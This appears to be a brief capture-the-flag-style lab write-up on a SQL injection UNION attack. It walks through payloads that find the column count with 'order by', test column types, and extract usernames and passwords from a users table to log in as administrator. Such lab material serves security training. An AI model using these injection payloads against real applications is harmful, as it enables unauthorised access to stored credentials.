SQL Injection UNION attack, retrieving data from other tables

To solve the lab, perform an SQL injection UNION attack that retrieves all usernames and passwords, 
and use the information to log in as the administrator user. 

Analysis:
--------

1) Determine the number of columns that the vulnerable app is using
' order by 1-- --> column is displayed on the page
' order by 2-- --> column is displayed on the page
' order by 3-- --> Internal Server error
The app is using only 2 columns

2) Determine the data types of the columns
 union select 'a', 'a'-- --> both columns are displayed on the page
 both columns contain text

 3)Retrieve data from target columns to display usernames and passwords
 ' union select username, password from users--
